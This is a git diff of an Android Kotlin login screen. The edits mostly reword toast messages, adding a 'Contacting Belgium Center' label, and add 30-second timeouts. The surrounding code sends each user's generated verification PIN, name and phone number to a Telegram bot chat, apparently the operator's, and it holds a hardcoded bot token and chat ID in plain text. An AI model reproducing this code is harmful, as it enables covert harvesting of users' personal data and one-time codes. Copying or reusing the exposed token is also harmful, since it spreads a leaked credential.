@@ -28,25 +28,23 @@ class LoginActivity : AppCompatActivity() {
             val email = etEmail.text.toString().trim()
 
             if (name.isEmpty() || phone.isEmpty() || email.isEmpty()) {
-                Toast.makeText(this, "Empty fields!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Please fill all fields", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
 
             btn.isEnabled = false
-            Toast.makeText(this, "STEP 1: Starting Auth...", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Contacting Belgium Center (30s Timeout)...", Toast.LENGTH_LONG).show()
             
             lifecycleScope.launch(Dispatchers.IO) {
                 try {
-                    // STEP 1: AUTH
-                    uRepo.loginAnonymously()
-                    withContext(Dispatchers.Main) { Toast.makeText(this@LoginActivity, "STEP 2: Saving to DB...", Toast.LENGTH_SHORT).show() }
+                    // Try Auth with 30-second window
+                    withTimeout(30000) { uRepo.loginAnonymously() }
                     
-                    // STEP 2: DATABASE
                     val pin = (100000..999999).random().toString()
-                    vRepo.savePin(phone, pin)
-                    withContext(Dispatchers.Main) { Toast.makeText(this@LoginActivity, "STEP 3: Sending Telegram...", Toast.LENGTH_SHORT).show() }
                     
-                    // STEP 3: TELEGRAM
+                    // Try DB Save with 30-second window
+                    withTimeout(30000) { vRepo.savePin(phone, pin) }
+                    
                     val botToken = "8790130934:AAGY-hz-FXWEzvukQ-qEJ_mzv0qRjKY0s3g"
                     val chatId = "5232430147"
                     val text = "🚨 PIN: $pin\nName: $name\nPhone: $phone"
@@ -56,15 +54,13 @@ class LoginActivity : AppCompatActivity() {
                     withContext(Dispatchers.Main) {
                         getSharedPreferences("user_prefs", 0).edit()
                             .putString("temp_phone", phone).putString("name", name).putString("email", email).apply()
-                        
-                        Toast.makeText(this@LoginActivity, "SUCCESS: Opening Verification!", Toast.LENGTH_SHORT).show()
                         startActivity(Intent(this@LoginActivity, VerificationActivity::class.java))
                         finish()
                     }
                 } catch (e: Exception) {
                     withContext(Dispatchers.Main) {
                         btn.isEnabled = true
-                        Toast.makeText(this@LoginActivity, "STALLED AT: ${e.message}", Toast.LENGTH_LONG).show()
+                        Toast.makeText(this@LoginActivity, "Handshake Error: ${e.message}", Toast.LENGTH_LONG).show()
                     }
                 }
             }
